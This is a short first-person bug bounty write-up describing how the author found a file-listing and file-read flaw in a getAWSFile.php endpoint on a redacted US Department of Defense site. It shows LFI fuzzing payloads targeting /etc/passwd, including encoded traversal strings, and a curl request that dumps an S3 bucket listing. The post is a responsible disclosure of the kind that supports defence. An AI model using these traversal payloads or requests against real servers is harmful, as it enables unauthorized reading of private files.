# How I (Technically) Hacked the Department of Defense

It’s counterintuitive, but one of the most accessible bug bounty programs is the one run by the US Department of Defense. This is probably a consequence of the massive attack service, dated technology (they still mostly use the LAMP stack), and thin IT support. So here’s how I bypassed their web security as a 19-year-old with a MacBook.

In keeping with the DOD policy, I've redacted the names of all sites and changed the names of all endpoints. 

I was poking around some software that supported marine navigation tech when I noticed an interesting endpoint ```https://REDACTED/getAWSFile.php?file=```. I could query a file from it, and it would return the requested file.

Since the site was running LAMP, I figured I would check for [Local File Inclusion (LFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) bugs, which old PHP applications are sometimes susceptible to. I was running a fuzzing script when I noticed something strange:

```bash
python3 lfi_fuzz.py
../../../etc/passwd                returned 413 B
../../../etc/passwd..........      returned 413 B
%c0%ae%c0%ae/etc/passwd            returned 413 B

[...]

.                                  returned 16024 B 
```

When I fed "." into the query, it returned **~4,000x** more data than it should. I quickly reproduced it with curl:

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: REDACTED.mil' -H $'Accept: */*' \
    -b $'JSESSIONID=<COOKIE>' \
    $'https://REDACTED.mil/getAWSFile.php?file=.'
```

which returned the result:

```xml
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
  <Name>REDACTED</Name>
  <Prefix/>
  <Marker/>
  <MaxKeys>1000</MaxKeys>
  <IsTruncated>false</IsTruncated>
  <Contents>
    <Key>example-object-1.txt</Key>
    <LastModified>2023-01-01T12:00:00.000Z</LastModified>
    <ETag>"1b2cf535f27731c974343645a3985328"</ETag>
    <Size>1024</Size>
    <StorageClass>STANDARD</StorageClass>
  </Contents>
  <Contents>
    <Key>example-object-2.jpg</Key>
    <LastModified>2023-01-02T15:30:00.000Z</LastModified>
    <ETag>"3a5c8b7f2f50d063edebf9cda548579f"</ETag>
    <Size>2048</Size>
    <StorageClass>STANDARD</StorageClass>
  </Contents>

[...]

</ListBucketResult>
```

Clearly, the server was fetching files from an external AWS bucket under the hood. When I fed it the "." character (which stands for 'the current directory' in the Unix shell) the Bucket interpreted it as such and dumped its entire directory listing. Since I now had the full path to every file on the bucket, I could just plug them into the file parameter of the request to read any file on the server.

To test this, I picked a random file, plugged it into the ```getAWSFile.php``` endpoint, and the server returned: 

```
--------------------------------------------------------------------------------

DATABASE:  /REDACTED

All libraries corrected through NTM 11/23 (18 March 2023).


-----GENERAL SCALE LIBRARIES: (2)

LOG 12.23.19
[...]
```

I tried this with a few more files and found that I could see and read *every file on the bucket*. Since the DOD takes their information security pretty seriously, I didn't enumerate any further and reported it. It was triaged and resolved in 72 hours.
